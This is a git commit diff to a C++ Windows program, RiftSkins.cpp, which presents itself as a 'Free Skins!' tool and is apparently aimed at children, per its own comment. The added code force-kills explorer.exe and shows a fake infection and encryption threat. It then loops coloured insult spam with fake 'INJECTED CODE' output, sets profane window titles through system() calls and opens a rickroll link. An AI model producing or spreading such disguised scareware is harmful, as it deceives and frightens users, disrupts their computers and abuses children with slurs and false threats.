66f64a8973770ddf33ac9e17bff0fee9793d91ab
Nax <74548019+nax1800@users.noreply.github.com>
2022-06-23 23:43:33 +0100

    Upgrade 🔥

--- Source/RiftSkins.cpp
+++ Source/RiftSkins.cpp
@@ -6,12 +6,14 @@
 #include <iostream>
 #include <random>
 
-
+#define _CRT_SECURE_NO_WARNINGS
 
 //This is harmless, but to the 9 year old in rift, their pc is fucked.
 
 bool bDeveloper = true; //don't forget to change 
-HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+HANDLE Console = GetStdHandle(STD_OUTPUT_HANDLE);
+
+int TimesRan = 0;
 
 int RandomInt(int min = 1, int max = 100)
 {
@@ -23,28 +25,81 @@ int RandomInt(int min = 1, int max = 100)
 	return dist6(rng);
 }
 
+std::vector<std::string> Insults = {
+	"FATTY",
+	"IDIOT",
+	"BOZO",
+	"POOPY HEAD",
+	"CUNT",
+	"CUMSOCK"
+};
+
+std::string GetRandomInsult()
+{
+	while (true)
+	{
+		int Idx = RandomInt(1, Insults.size()) - 1;
+		std::string Insult = Insults[Idx];
+
+		auto rng = std::default_random_engine{};
+		std::shuffle(Insults.begin(), Insults.end(), rng);
+
+		return Insult;
+	}
+}
+
 void SpamShit()
 {
-	SetConsoleTextAttribute(hConsole, RandomInt(15));
-	std::cout << "GET FUCKED LMFAOO\n";
-	SetConsoleTextAttribute(hConsole, RandomInt(15));
-	std::cout << "NEXT TIME DON'T ASK FOR SKINS\n";
+	auto str = GetRandomInsult();
+	char* cstr = &str[0];
+
+	char Command[256];
+
+	strncpy(Command, "title GET FUCKED ", sizeof(Command));
+	strncat(Command, cstr, sizeof(Command));
+
+	system(Command);
+	system("cls");
+
+LoadShit:
+
+	TimesRan++;
+	int color1 = RandomInt(1, 15);
+	int color2 = RandomInt(1, 15);
+
+	SetConsoleTextAttribute(Console, color1);
+	std::cout << "GET FUCKED LMFAOO\n\n";
+	SetConsoleTextAttribute(Console, color2);
+	std::cout << "NEXT TIME DON'T ASK FOR SKINS\n\n";
+	SetConsoleTextAttribute(Console, color1);
+	std::cout << "INJECTED CODE: " << RandomInt(0, 956) << "\n\n";
 
 	if (!bDeveloper)
 		ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
+
+	Sleep(250);
+	system("cls");
+
+	if (TimesRan >= 40)
+		MessageBoxA(nullptr, "You Have Been Trolled:) Your Computer Is Actually Fine But Don't Be Annoying Asking For Skins.", "BOZO", MB_OK);
+	else
+		goto LoadShit;
 }
 
 int main()
 {
+	system("title Free Skins!");
 	if (!bDeveloper)
 	{
 		system("taskkill /IM explorer.exe /F");
 		MessageBoxA(nullptr, "Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)", "skīñś", MB_OK);
 	}
-
-LoadShit:
+	int FakeCode = RandomInt(0, 956);
+	system("color 0C");
+	std::cout << "INJECTING CODE: " << FakeCode << "\n";
+	Sleep(500);
+	std::cout << "INJECTED CODE: " << FakeCode << "\n";
+	Sleep(500);
 	SpamShit();
-	goto LoadShit;
-
 	return 0;
 }
